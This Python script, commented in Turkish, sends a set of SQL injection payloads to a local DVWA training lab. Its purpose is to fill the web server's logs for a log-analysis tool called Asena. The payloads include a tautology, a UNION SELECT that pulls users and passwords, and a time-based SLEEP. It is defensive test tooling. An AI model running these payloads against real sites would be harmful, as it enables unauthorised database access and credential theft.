#!/usr/bin/env python3
# =============================================================================
# ASENA-ANALYSIS — Hukuki şerh: Yalnızca izinli lab (localhost DVWA). LEGAL.md
# =============================================================================
"""
Pusat (payload) test — DVWA SQL Injection sayfasına örnek istekler gönderir;
Apache access.log dolar; Asena ``analyze`` / ``watch`` ile izlenebilir.

Önkoşul: Tarayıcıda DVWA'ya giriş yapın; geliştirici araçlarından PHPSESSID değerini alın.

Kullanım:
  set DVWA_PHPSESSID=abc123
  python scripts/dvwa_sqli_pusat_sim.py

veya:
  python scripts/dvwa_sqli_pusat_sim.py --phpsessid abc123
"""

from __future__ import annotations

import argparse
import os
import sys
import time
from typing import Sequence

try:
    import requests
except ImportError as e:
    print("Hata: 'requests' gerekli. pip install requests", file=sys.stderr)
    raise SystemExit(2) from e

DEFAULT_URL = "http://127.0.0.1:8081/vulnerabilities/sqli/"

# Lab senaryosu: keşif → boolean → UNION → zaman tabanlı (manuel senaryo ile uyumlu)
DEFAULT_PAYLOADS: Sequence[str] = (
    "1'",
    "1' OR 1=1 --",
    "1' ORDER BY 1--",
    "1' UNION SELECT user, password FROM users --",
    "1' AND SLEEP(5) --",
)


def _cookies(phpsessid: str, security: str) -> dict[str, str]:
    return {"PHPSESSID": phpsessid.strip(), "security": security.strip().lower()}


def simulate_attack(
    base_url: str,
    phpsessid: str,
    *,
    security: str = "low",
    payloads: Sequence[str] = DEFAULT_PAYLOADS,
    delay_s: float = 0.5,
    timeout_s: float = 30.0,
) -> None:
    cookies = _cookies(phpsessid, security)
    for p in payloads:
        params = {"id": p, "Submit": "Submit"}
        print(f"[*] Gönderiliyor: {p!r}")
        try:
            r = requests.get(
                base_url,
                params=params,
                cookies=cookies,
                timeout=timeout_s,
            )
            print(f"    <- HTTP {r.status_code}, {len(r.content)} bayt")
        except requests.RequestException as ex:
            print(f"    [!] İstek hatası: {ex}", file=sys.stderr)
        if delay_s > 0:
            time.sleep(delay_s)


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(
        description="DVWA SQLi lab — localhost için örnek payload istekleri (Asena log doldurma).",
    )
    p.add_argument(
        "--url",
        default=os.environ.get("DVWA_SQLI_URL", DEFAULT_URL),
        help=f"Hedef SQLI URL (varsayılan: {DEFAULT_URL})",
    )
    p.add_argument(
        "--phpsessid",
        default=os.environ.get("DVWA_PHPSESSID", "").strip(),
        metavar="ID",
        help="Tarayıcıdan kopyalanan PHPSESSID (veya ortam: DVWA_PHPSESSID)",
    )
    p.add_argument(
        "--security",
        default=os.environ.get("DVWA_SECURITY", "low"),
        choices=("low", "medium", "high", "impossible"),
        help="DVWA güvenlik seviyesi çerezi (varsayılan: low)",
    )
    p.add_argument(
        "--delay",
        type=float,
        default=0.5,
        metavar="SEC",
        help="İstekler arası bekleme saniye (varsayılan: 0.5)",
    )
    p.add_argument(
        "--timeout",
        type=float,
        default=30.0,
        help="HTTP zaman aşımı saniye (SLEEP payload için yüksek tutun)",
    )
    args = p.parse_args(argv)

    if not args.phpsessid:
        print(
            "Hata: PHPSESSID yok. Tarayıcıda DVWA'ya giriş yapın, "
            "çerezden PHPSESSID kopyalayın:\n"
            "  python scripts/dvwa_sqli_pusat_sim.py --phpsessid SIZIN_ID\n"
            "veya: set DVWA_PHPSESSID=SIZIN_ID",
            file=sys.stderr,
        )
        return 2

    print("⚖️ Yalnızca localhost / izinli DVWA lab. Yetkisiz hedefe kullanmayın.\n")
    base = args.url if args.url.endswith("/") else args.url + "/"
    simulate_attack(
        base,
        args.phpsessid,
        security=args.security,
        payloads=DEFAULT_PAYLOADS,
        delay_s=args.delay,
        timeout_s=args.timeout,
    )
    print("\n[*] Bitti. Log: docker/logs/apache2/access.log — Asena: python asena.py analyze --i-accept")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
